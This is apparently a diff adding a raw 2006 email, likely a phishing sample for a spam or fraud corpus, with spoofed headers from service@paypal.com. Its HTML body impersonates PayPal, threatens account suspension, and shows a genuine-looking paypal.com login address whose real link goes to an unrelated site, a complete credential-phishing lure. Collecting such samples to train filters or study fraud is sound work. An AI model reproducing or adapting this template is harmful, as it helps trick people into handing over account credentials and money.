@@ -1,0 +1,114 @@
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+	by example.com (Postfix) with ESMTP id 3BB7D2A88C
+	for <user@example.com>; Sat, 25 Feb 2006 14:49:58 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+	id 2B2A0621C9C; Sat, 25 Feb 2006 14:49:58 -0500 (EST)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+	by mail.example.com (Example mail relay) with ESMTP id CAB77621C9A
+	for <user@example.com>; Sat, 25 Feb 2006 14:49:57 -0500 (EST)
+Received: (from user@localhost)
+	by mail.example.com id OAA08945
+	for user@example.com; Sat, 25 Feb 2006 14:49:51 -0500
+Received: from infoble.net (infoble.net [66.249.1.213])
+	by mail.example.com with ESMTP id OAA08937
+	for <user@example.com>; Sat, 25 Feb 2006 14:49:50 -0500
+From: service@paypal.com
+Received: from User ([86.105.172.66])
+	(authenticated)
+	by infoble.net (8.11.6/8.11.6) with ESMTP id k1PJktM01984;
+	Sat, 25 Feb 2006 11:46:55 -0800
+Message-Id: <200602251946.k1PJktM01984@infoble.net>
+Subject: Important Notice about your PayPal Account !
+Date: Sat, 25 Feb 2006 21:47:25 +0200
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+To: undisclosed-recipients: ;
+Content-Length: 3133
+Lines: 72
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 317
+
+<html>
+<head>
+</head>
+<body>
+<div align="left"><a href="http://www.paypal.com"><img
+src="http://www.paypal.com/en_US/i/header/t1Hdr_hpGraphic_563x115.jpg"
+border="0"></a> 
+</div>
+<table align="center" border="0" cellpadding="0" cellspacing="0"
+width="600">
+<tbody>
+<tr>
+<td colspan="3"><img src="pp.files/pixel.gif" height="2" width="2"></td>
+</tr>
+</tbody>
+</table>
+<a href="http://www.paypal.com/cgi-bin/webscr?cmd=_login-run">
+</a>
+<table border="0" width="50%">
+<tbody>
+<tr>
+<td>
+<p><font size="2"><font face="Verdana">Dear valued <strong><strong><span
+style="font-size: 10pt; color: black; font-family: Verdana;">PayPal<sup>®</sup></span></strong> </strong>member</font>: <br>
+</font><br>
+</p>
+<p><font face="Verdana" size="2">It has come to our attention
+that your <span
+style="font-size: 10pt; color: black; font-family: Verdana;"><strong>PayPal<sup>®</sup></strong></span>
+account information needs to be updated as part of our continuing
+commitment to protect your account and to reduce the instance of
+fraud on our website. </font><font face="Verdana" size="2"><font
+face="Verdana" size="2"> If you could please take 5-10
+minutes out of your </font><font face="Verdana" size="2">online </font><font
+face="Verdana" size="2">experience and update your personal records
+you will not run into any future </font><font face="Verdana"
+size="2">problems with the online service. <br>
+                                     </font></font></p>
+<font face="Verdana" size="2">
+<p><font face="Verdana" size="2">However, failure to update your
+records will result in account suspension. <br>
+ <br>
+<br>
+Once you have updated your account records, your <span
+style="font-size: 10pt; color: black; font-family: Verdana;"><strong>PayPal<sup>®</sup></strong></span>
+session will not be interrupted and will continue as normal. </font></p>
+<p><font face="Verdana" size="2">To update your <span
+style="font-size: 10pt; color: black; font-family: Verdana;"><strong>PayPal<sup>®</sup></strong></span>
+records click on the following link: <br>
+</font> <a href="http://is1.seven.co.jp/.web/index.html"><font
+face="Verdana" size="2">http://www.paypal.com/cgi-bin/webscr?cmd=_login-run</font></a></p>
+<p><font face="Verdana" size="2"></font> </p>
+<p><font face="Verdana" size="2">Thank You.  <br>
+<span style="font-size: 10pt; color: black; font-family: Verdana;"><strong>PayPal<sup>®
+</sup><span
+style="font-size: 10pt; color: black; font-family: Verdana;">UPDATE </span></strong><span
+style="font-size: 10pt; color: black; font-family: Verdana;"><strong>TEAM</strong></span></span>                                    
+</font></p>
+<img src="http://www.paypal.com/en_US/i/logo/paypal_logo.gif"
+border="0"> <font face="Verdana" size="2">
+<p><font face="Verdana" size="2">Accounts Management As outlined
+in our User Agreement, <span
+style="font-size: 10pt; color: black; font-family: Verdana;"><strong>PayPal<sup>®</sup></strong></span>
+will periodically send you information about site changes and
+enhancements. </font></p>
+</font></font></td>
+</tr>
+</tbody>
+</table>
+<a href="http://www.paypal.com/cgi-bin/webscr?cmd=_login-run"> </a>
+</body>
+</html>
+
